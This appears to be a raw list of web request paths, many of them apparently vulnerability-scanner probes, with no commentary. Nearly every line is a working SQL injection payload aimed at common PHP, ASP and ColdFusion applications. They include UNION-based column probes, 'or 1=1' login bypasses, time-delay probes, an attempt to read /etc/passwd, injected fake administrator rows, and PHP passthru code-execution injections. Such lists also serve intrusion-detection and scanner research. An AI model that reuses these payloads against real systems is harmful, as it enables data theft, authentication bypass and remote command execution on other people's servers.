 /examples/jsp/jsp2/jspx/index.php?id='union/**/select/**/0,0,616656011,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/calendar.php?month=' union select 1,1,'1331909175','calendarix_month_sql_injection.nasl',1 #
-
 /cacti/index.php?id='union/**/select/**/0,0,1448356578,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /examples/jsp/cal/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_83ihjgrj]));die;/*
-
 /scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331909420,1,1564569063--
-
 /scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1331919215,154330261 --
-
 /cgi-bin/mail.php?id='/**/union/**/select/**/1,2,1332009308,4--&blog=1
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 109024103--
-
 /phpmyadmin/index.php?id='union/**/select/**/0,0,1358744507,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /examples/jsp/jsp2/jspx/index.php?op=default&date=200607' union select 1,1908404704,1,1,1,1,1,1,1,1--&blogid=1
-
 /index.php?op=default&date=200607' union select 1,240520592,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/index.php?op=default&date=200607' union select 1,1409814507,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/calendar.php?month=' union select 1,1,'1331908849','calendarix_month_sql_injection.nasl',1 #
-
 /scripts/event_view.php?eid=34 union select 688985287
-
 /examples/servlets/servlet/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
-
 /index.php?op=default&date=200607' union select 1,793421908,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/colors/index.php?id='union/**/select/**/0,0,1917618887,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /phpmyadmin/index.php?page=documents&doc=-99' union select null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null--
-
 /examples/servlets/servlet/index.php?op=default&date=200607' union select 1,106876795,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/mail.php?id='/**/union/**/select/**/1,2,1332009308,4--&blog=1
-
 /mail.php?id='/**/union/**/select/**/1,2,1331919225,4--&blog=1
-
 /examples/jsp/jsp2/jspx/index.php?id='union/**/select/**/0,0,1843478711,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_8ypa_2_i]));die;/*
-
 /admin/utilities_confighelp.asp?helpfield=-1') union select configval as confighelp from storeadmin where configvar='storeversion' or ('1'='2
-
 /examples/jsp/jsp2/el/mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 878723476--
-
 /en-us/account/mail.php?id='/**/union/**/select/**/1,2,1331905235,4--&blog=1
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1331905039+or+1=1+--+';passthru(base64_decode($_server[http_nessus_evc6w6sf]));die;/*
-
 /scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331919216,1114321675 -- 
-
 /mail.php?id='/**/union/**/select/**/1,2,1332009308,4--&blog=1
-
 /manager/?user=jffnms_user_sql_injection.nasl' union select 2,'admin','$1$rxs1rotx$iza1s3fccfyvfa9rwkbmi.','administrator'--&file=index&pass=
-
 /cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331909400,244455451 -- 
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331904437,0x3a,577347075),3,4,5,6,7,8,9,10,11,12,13,14,15,16
-
 /examples/jsp/error/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /scripts/index.php?op=default&date=200607' union select 1,1735345304,1,1,1,1,1,1,1,1--&blogid=1
-
 /index.php?id='union/**/select/**/0,0,531946285,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/faq.php?action=&type=view&s=&id=-1' union select 0,939754819,0,0,0,0,0--
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 1435895751--
-
 /cgi-bin/index.php?id='union/**/select/**/0,0,1849623348,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /examples/jsp/sessions/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /www/delivery/ac.php?bannerid=-1331919146+or+1=1+--+';passthru(base64_decode($_server[http_nessus_ag5vvnfs]));die;/*
-
 /examples/servlets/servlet/mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1
-
 /scripts/index.php?op=default&date=200607' union select 1,1249459115,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/www/delivery/ac.php?bannerid=-219+or+1=1
-
 /scripts/www/delivery/ac.php?bannerid=-106+or+1=1
-
 /scripts/faq.php?action=&type=view&s=&id=-1' union select 0,1229033432,0,0,0,0,0--
-
 /examples/jsp/checkbox/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
-
 /index.php?id='union/**/select/**/0,0,139114652,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331923204','5'--
-
 /scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332010400','5'--
-
 /examples/jsp/error/faq.php?action=&type=view&s=&id=-1' union select 0,2039524728,0,0,0,0,0--
-
 /examples/jsp/jsp2/jspx/faq.php?action=&type=view&s=&id=-1' union select 0,32936669,0,0,0,0,0--
-
 /memberlist.php?action=profile&id=1' select * from force_mysql_warning
-
 /examples/jsp/error/mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,203712303,473923447,1,1,1,1,1--&blogid=1
-
 /top.php?stuff=(1-(select null from (select null) t where 'n681t2ki'='n681t2ki'))
-
 /examples/jsp/jsp2/el/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331908728,0x3a,1791311072),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
-
 /scripts/calendar.php?month=' union select 1,1,'1331904224','calendarix_month_sql_injection.nasl',1 #
-
 /cgi-bin/index.php?id='union/**/select/**/0,0,927895779,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331918993',null,null,null,null --
-
 /examples/jsp/checkbox/faq.php?action=&type=view&s=&id=-1' union select 0,1622415956,0,0,0,0,0--
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331919000,0x3a,576275653),3,4,5,6,7,8,9,10,11,12,13,14,15,16
-
 /cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331908738','5'--
-
 /scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331919216,539900350 -- 
-
 /scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1332010398
-
 /faq.php?action=&type=view&s=&id=-1' union select 0,218106892,0,0,0,0,0--
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,1415485766,1622819751,1,1,1,1,1--&blogid=1
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331923200,0x3a,196871378),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
-
 /recordings/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331919009','5'--
-
 /phpmyadmin/calendar.php?month=' union select 1,1,'1331923199','calendarix_month_sql_injection.nasl',1 #
-
 /phpmyadmin/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1331908788+or+1=1+--+';passthru(base64_decode($_server[http_nessus_cvzsqn29]));die;/*
-
 /examples/jsp/num/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1332009306
-
 /phpmyadmin/documentation.html?phpmyadmin=map47fckapd3c2j9d7svslcjakhdm1fs"; waitfor delay '0:0:4' -- 
-
 /en-us/account/calendar.php?month=' union select 1,1,'1331909343','calendarix_month_sql_injection.nasl',1 #
-
 /cacti/faq.php?action=&type=view&s=&id=-1' union select 0,2083950439,0,0,0,0,0--
-
 /manager/index.php?id='union/**/select/**/0,0,1512225497,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /faq.php?action=&type=view&s=&id=-1' union select 0,960542939,0,0,0,0,0--
-
 /phpmyadmin/index.php?op=default&date=200607' union select 1,609673267,1,1,1,1,1,1,1,1--&blogid=1
-
 /cacti/www/delivery/ac.php?bannerid=-1331905039+or+1=1+--+';passthru(base64_decode($_server[http_nessus_jngdhflg]));die;/*
-
 /plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,371460352,0,0,0,0,0--
-
 /examples/jsp/checkbox/index.php?op=default&date=200607' union select 1,162548266,1,1,1,1,1,1,1,1--&blogid=1
-
 /top.php?stuff=1417058040' and 1=1 and ''<>'zoilnzf1
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 1161517009,2,1674610116,4,5,6,7,8,9,0,1,2,3 --
-
 /main.php?stuff=1985387140' and 1=1 and ''<>'bvys4izi
-
 /scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904238,927121236 -- 
-
 /scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331923201
-
 /scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1332010406,1,1928557356--
-
 /examples/jsp/num/index.php?op=default&date=200607' union select 1,652029819,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331919223,1,390336409--
-
 /scripts/index.php?op=default&date=200607' union select 1,597038072,1,1,1,1,1,1,1,1--&blogid=1
-
 /index.php?id='union/**/select/**/0,0,1649969852,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331908736,1948616015 -- 
-
 /examples/jsp/colors/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1331923205,4,5
-
 /cgi-bin/mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1
-
 /site/' union all select filetoclob('/etc/passwd','server')::html,0 from sysusers where username=user --/.html
-
 /index.php?op=default&date=200607' union select 1,166144719,1,1,1,1,1,1,1,1--&blogid=1
-
 /cgi-bin/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331909312',null,null,null,null --
-
 /scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1331919224,4,5
-
 /phpmyadmin/documentation.html?phpmyadmin=map47fckapd3c2j9d7svslcjakhdm1fs" and sleep(4)="
-
 /manager/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331905166,0x3a,1536152654),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
-
 /examples/servlets/servlet/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--
-
 /scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331908856
-
 /cgi-bin/index.php?op=default&date=200607' union select 1,733583767,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 368985119--
-
 /scripts/index.php?option=weblinks&itemid=2&catid=-1 union select 0,1,2,094227280668,4,5,6,7,8,9,10,11--
-
 /index.php?id='union/**/select/**/0,0,1474576637,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,1139093737,0,0,0,0,0--
-
 /www/delivery/ac.php?bannerid=-1332008596+or+1=1+--+';passthru(base64_decode($_server[http_nessus_pqgrdtsr]));die;/*
-
 /index.php?id='union/**/select/**/0,0,739400234,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331905213,113095511 -- 
-
 /cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
-
 /examples/jsp/cal/index.php?op=default&date=200607' union select 1,1986790207,1,1,1,1,1,1,1,1--&blogid=1
-
 /index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332009305',null,null,null,null --
-
 /scripts/faq.php?action=&type=view&s=&id=-1' union select 0,1403993486,0,0,0,0,0--
-
 /scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331919183',null,null,null,null --
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,1126849470,1437216392,1,1,1,1,1--&blogid=1
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331919200,0x3a,1131566153),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
-
 /cacti/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331909407','5'--
-
 /scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1331919223,4,5
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,418619243,434476407,1,1,1,1,1--&blogid=1
-
 /recordings/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331919008,1645922045 -- 
-
 /evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331919008,1645922045 -- 
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 1089880881--
-
 /manager/mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1
-
 /pcadmin/login.asp?idadmin='' or 1=1--
-
 /scripts/www/delivery/ac.php?bannerid=-1331919146+or+1=1+--+';passthru(base64_decode($_server[http_nessus_tuezckvg]));die;/*
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 1313328975--
-
 /examples/jsp/num/faq.php?action=&type=view&s=&id=-1' union select 0,230233793,0,0,0,0,0--
-
 /cgi-bin/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331908834',null,null,null,null --
-
 /manager/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--
-
 /scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331908738','5'--
-
 /examples/jsp/sessions/index.php?id='union/**/select/**/0,0,1705245003,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--
-
 /scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332010395',null,null,null,null --
-
 /examples/servlets/servlet/index.php?id='union/**/select/**/0,0,1680418306,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/?user=jffnms_user_sql_injection.nasl' union select 2,'admin','$1$rxs1rotx$iza1s3fccfyvfa9rwkbmi.','administrator'--&file=index&pass=
-
 /scripts/www/delivery/ac.php?bannerid=-1332010390+or+1=1+--+';passthru(base64_decode($_server[http_nessus_seiprcet]));die;/*
-
 /examples/jsp/num/index.php?op=default&date=200607' union select 1,742994120,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1331919007,1010516896 --
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 625315727--
-
 /scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331908714',null,null,null,null --
-
 /examples/jsp/jsp2/el/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1331904221+or+1=1+--+';passthru(base64_decode($_server[http_nessus_lrajflyx]));die;/*
-
 /scripts/mail.php?id='/**/union/**/select/**/1,2,1331904244,4--&blog=1
-
 /www/delivery/ac.php?bannerid=-1331923190+or+1=1+--+';passthru(base64_decode($_server[http_nessus_ywcwjzkf]));die;/*
-
 /en-us/account/mail.php?id='/**/union/**/select/**/1,2,1331909423,4--&blog=1
-
 /scripts/event_view.php?eid=34 union select 660865227
-
 /scripts/forum.php3?id_article=1&id_forum=-1/**/union/**/select 1444832703--
-
 /cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
-
 /index.php?op=default&date=200607' union select 1,72750636,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/jsp2/jspx/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,1014388214 -- 
-
 /scripts/www/delivery/ac.php?bannerid=-1331923190+or+1=1+--+';passthru(base64_decode($_server[http_nessus_846o0yft]));die;/*
-
 /examples/servlets/servlet/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /examples/jsp/jsp2/el/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
-
 /scripts/mail.php?id='/**/union/**/select/**/1,2,1332010419,4--&blog=1
-
 /index.php?op=default&date=200607' union select 1,847164494,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/sessions/faq.php?action=&type=view&s=&id=-1' union select 0,784779737,0,0,0,0,0--
-
 /index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331923197',null,null,null,null --
-
 /examples/jsp/sessions/index.php?op=default&date=200607' union select 1,1394748835,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/pcadmin/login.asp?idadmin='' or 1=1--
-
 /index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331919219','5'--
-
 /scripts/mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1
-
 /scripts/index.php?op=viewalbum&albumid=-1/**/union/**/select/**/0,1,266652800,1186686792,1,1,1,1,1--&blogid=1
-
 /scripts/event_view.php?eid=34 union select 294969347
-
 /examples/jsp/colors/mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1
-
 /examples/jsp/jsp2/jspx/mail.php?id='/**/union/**/select/**/1,2,1331904464,4--&blog=1
-
 /cgi-bin/index.php?id='union/**/select/**/0,0,422787269,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331905220','5'--
-
 /phpmyadmin/admin/index.php?act=login&username=' union select 1,'pafaq_10b4.nasl','5e0bd03bec244039678f2b955a2595aa','',0,'',''--&password=nessus
-
 /recordings/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /cgi-bin/index.php?id='union/**/select/**/0,0,1780794214,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /examples/jsp/colors/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus__zozllvj]));die;/*
-
 /manager/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_uhkmnhw4]));die;/*
-
 /faq.php?action=&type=view&s=&id=-1' union select 0,1279798921,0,0,0,0,0--
-
 /cgi-bin/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331904216',null,null,null,null --
-
 /examples/jsp/error/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904458','5'--
-
 /cgi-bin/index.php?op=default&date=200607' union select 1,1126595310,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/colors/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
-
 /recordings/www/delivery/ac.php?bannerid=-1331918977+or+1=1+--+';passthru(base64_decode($_server[http_nessus_mlv7_r6z]));die;/*
-
 /recordings/index.php?op=default&date=200607' union select 1,236807234,1,1,1,1,1,1,1,1--&blogid=1
-
 /cacti/index.php?op=default&date=200607' union select 1,1437541757,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/www/delivery/ac.php?bannerid=-1331919145+or+1=1+--+';passthru(base64_decode($_server[http_nessus_8bf7v1kl]));die;/*
-
 /scripts/calendar.php?month=' union select 1,1,'1331919194','calendarix_month_sql_injection.nasl',1 #
-
 /scripts/calendar.php?month=' union select 1,1,'1332010396','calendarix_month_sql_injection.nasl',1 #
-
 /evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331919216,1114321675 -- 
-
 /scripts/index.php?id='union/**/select/**/0,0,1675094385,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /mail.php?id='/**/union/**/select/**/1,2,1331919012,4--&blog=1
-
 /cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331908736,1948616015 -- 
-
 /scripts/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /recordings/index.php?page=documents&doc=-99' union select null,null,'nessus','dcpportal_sql.nasl',null,null,null,null,null,null,null,null--
-
 /evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331904454,472430861 -- 
-
 /cgi-bin/faq.php?action=&type=view&s=&id=-1' union select 0,127142342,0,0,0,0,0--
-
 /scripts/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904240','5'--
-
 /scripts/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1332010414,1557267964 -- 
-
 /cgi-bin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331909407','5'--
-
 /cgi-bin/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332010395',null,null,null,null --
-
 /modules.php?name=web_links&l_op=viewlinkcomments&lid=2pp'/**/union/**/select/**/'412745581503'/*
-
 /examples/jsp/jsp2/jspx/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904457','5'--
-
 /en-us/account/cal_event.php?id=1' union select 1,2,'calendarix_id_sql_injection.nasl',4,5,6,7,8,9,10,11,12,13--
-
 /scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1331904452,2000273248 --
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 846061434,2,198865279,4,5,6,7,8,9,0,1,2,3 --
-
 /examples/jsp/jsp2/jspx/index.php?op=default&date=200607' union select 1,1515512280,1,1,1,1,1,1,1,1--&blogid=1
-
 /scripts/index.php?op=default&date=200607' union select 1,1779141938,1,1,1,1,1,1,1,1--&blogid=1
-
 /faq.php?action=&type=view&s=&id=-1' union select 0,1377586613,0,0,0,0,0--
-
 /scripts/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1332010409',null,null,null,null --
-
 /scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1331905207,2042987140 --
-
 /www/delivery/ac.php?bannerid=-1331904222+or+1=1+--+';passthru(base64_decode($_server[http_nessus_sgcjosth]));die;/*
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1331904368+or+1=1+--+';passthru(base64_decode($_server[http_nessus_1olrgkbn]));die;/*
-
 /scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1331908887,4,5
-
 /scripts/spt--forumtopics.php?forumid=-9 union select null,null,null,1331919012,4,5
-
 /www/delivery/ac.php?bannerid=-1331904184+or+1=1+--+';passthru(base64_decode($_server[http_nessus_2pzvm7lp]));die;/*
-
 /en-us/account/faq.php?action=&type=view&s=&id=-1' union select 0,1692805728,0,0,0,0,0--
-
 /scripts/www/delivery/ac.php?bannerid=-1332008322+or+1=1+--+';passthru(base64_decode($_server[http_nessus_lcfxz0km]));die;/*
-
 /cgi-bin/index.php?id='union/**/select/**/0,0,419495929,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /en-us/account/calendar.php?month=' union select 1,1,'1331905155','calendarix_month_sql_injection.nasl',1 #
-
 /scripts/forum.php?id_article=1&id_forum=-1/**/union/**/select 199771194--
-
 /scripts/www/delivery/ac.php?bannerid=-1332010394+or+1=1+--+';passthru(base64_decode($_server[http_nessus_llrkno2s]));die;/*
-
 /cgi-bin/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331908714',null,null,null,null --
-
 /examples/jsp/colors/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /manager/index.php?module=topics&func=view&topicid=-1 union select null,null,'mdpro_topicid_sql_injection.nasl-1331904418',null,null,null,null --
-
 /manager/admin/index.php?act=login&username=' union select 1,'pafaq_10b4.nasl','5e0bd03bec244039678f2b955a2595aa','',0,'',''--&password=nessus
-
 /cacti/index.php?id='union/**/select/**/0,0,1185697098,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /examples/jsp/num/index.php?id='union/**/select/**/0,0,669748674,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /cgi-bin/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1332008334,1061714587 -- 
-
 /scripts/index.php?id='union/**/select/**/0,0,1385593493,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?id='union/**/select/**/0,0,814698580,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /manager/index.php?op=default&date=200607' union select 1,1605338494,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/num/plog-download.php?dl_type=album&checked[]=' union select 'plogger_checked_sql_injection.nasl',0,0,0,0,0,0,0,0,0,0,0,0,0,0 -- 
-
 /phpmyadmin/www/delivery/ac.php?bannerid=-1331923190+or+1=1+--+';passthru(base64_decode($_server[http_nessus_9yqoog2m]));die;/*
-
 /cgi-bin/index.php?id='union/**/select/**/0,0,1790180624,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/index.php?act=sm_window&page=event&day=-1 union select 1,1331908735,712064188 --
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331904227,0x3a,1244506787),3,4,5,6,7,8,9,10,11,12,13,14,15,16
-
 /scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1331905232,1,30450087--
-
 /mail.php?id='/**/union/**/select/**/1,2,1331905235,4--&blog=1
-
 /scripts/index.php?op=default&date=200607' union select 1,372196707,1,1,1,1,1,1,1,1--&blogid=1
-
 /examples/jsp/cal/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331904456','5'--
-
 /examples/jsp/cal/index.php?op=default&date=200607' union select 1,1085399282,1,1,1,1,1,1,1,1--&blogid=1
-
 /manager/insertorder.cfm?cfid=1&cftoken=1 union select 1,2,3,4,storename,6,7,8,9,10,11,12,13,14,15 from params"having 1=1
-
 /phpmyadmin/index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331923204','5'--
-
 /cgi-bin/www/delivery/ac.php?bannerid=-1331904367+or+1=1+--+';passthru(base64_decode($_server[http_nessus_y1ahivl4]));die;/*
-
 /scripts/faq.php?action=&type=view&s=&id=-1' union select 0,1702272795,0,0,0,0,0--
-
 /scripts/index.php?go=detail&id=-99999/**/union/**/select/**/0,1,concat(1331904437,0x3a,504398662),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
-
 /scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331919001
-
 /index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1331909407','5'--
-
 /scripts/ajax.php?rs=__exp__getfeedcontent&rsargs[]=-99 union select 1247962577,2,176146104,4,5,6,7,8,9,0,1,2,3 --
-
 /index.php?id='union/**/select/**/0,0,1888865436,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0--
-
 /scripts/event_view.php?eid=34 union select 125016811
-
 /scripts/modules/tinymce/content_css.php?templateid=-1/**/union/**/select/**/1332008335,1,1403210863--
-
 /en-us/account/evb/check_url.php?url=pligg_url_sql_injection.nasl' union select 1331909400,244455451 -- 
-
 /index.php?x=browse&category='union select '1','2','pixelpost_category_sql_injection.nasl','1332009307','5'--
-
 /scripts/cal_cat.php?op=cats&year=2008&catview=1+union+select+1,1331904228
-
